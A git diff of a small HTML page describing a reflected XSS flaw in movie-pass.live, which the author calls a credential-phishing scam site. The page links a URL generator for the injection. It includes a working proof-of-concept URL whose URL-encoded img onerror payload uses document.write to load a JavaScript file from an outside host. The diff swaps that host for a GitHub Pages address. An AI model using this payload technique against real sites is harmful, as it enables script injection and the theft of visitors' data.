@@ -26,11 +26,12 @@
             text-align:center;
         }
     </style>
-    <title>movie-pass.live XSS</title>
+    <title>movie-pxss</title>
 </head>
 <body>
-    <h1>movie-pass.live XSS</h1>
+    <h1>movie-pxss</h1>
     <h2>UPDATE: movie-pass.live is now premium4kflix.club. However, my tool still works with literally no changes.</h2>
+    <p>Use <a href="generatorTool.html">Generator Tool</a> to generate your own URL with any html you want!</p>
     <p>
         movie-pass.live is a scam website that attempts to get an email:password from the end user. The way it does this is by targeted advertising defined by the URL.<br />
         https://movie-pass.live/su/?s=S&cid=REFERRER-ID&q=MOVIE-TITLE&a=A&img=HEADERBANNERIMG is the structure of these URLs. If you paste that into your URL bar to visit the page, you'll actually see it leads to an advertisement for "MOVIE-TITLE".<br />
@@ -43,9 +44,8 @@
     </p>
     <p>
         I was actually able to get injected js files to work. You can see that here:<br />
-        <a href="https://movie-pass.live/su/?s=xss&cid=&q=%3Cimg+src+onerror%3D%22document.write(%27%3Cscript+src%3D\https://kontackt.co/XSS-externalLink.js%3E%3C%2Fscript%3E%27)%22%3E%3C%2Fimg%3E&a=3&img=" target="_blank">movie-pass.live</a>
+        <a href="https://movie-pass.live/su/?s=xss&cid=&q=%3Cimg+src+onerror%3D%22document.write(%27%3Cscript+src%3D\https://luphoria.github.io/XSS-externalLink.js%3E%3C%2Fscript%3E%27)%22%3E%3C%2Fimg%3E&a=3&img=" target="_blank">movie-pass.live</a>
     </p>
-    <p>Use <a href="generatorTool.html">Generator Tool</a> to generate your own URL with any html you want!</p>
     <i> - luphoria</i>
 </body>
 </html>
